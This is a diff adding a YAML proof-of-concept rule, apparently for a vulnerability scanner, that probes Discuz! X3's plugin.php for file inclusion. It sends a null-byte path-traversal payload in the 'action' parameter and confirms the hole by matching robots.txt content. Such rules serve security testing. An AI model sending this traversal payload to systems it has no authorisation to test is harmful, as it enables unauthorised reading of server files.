@@ -1,0 +1,16 @@
+name: poc-yaml-discuz-file-contains
+rules:
+  - method: GET
+    path: /plugin.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: action=../../../../../robots.txt%00&id=dc_mall
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.body.bcontains(b"robots.txt for Discuz! X3")
+detail:
+  author: Explo1t
+  links:
+    - https://github.com/epony4c
+    - http://www.wooyun.org/bugs/wooyun-2015-0131386
+    - http://www.ailab.com.cn/article-1077-259972-1.html
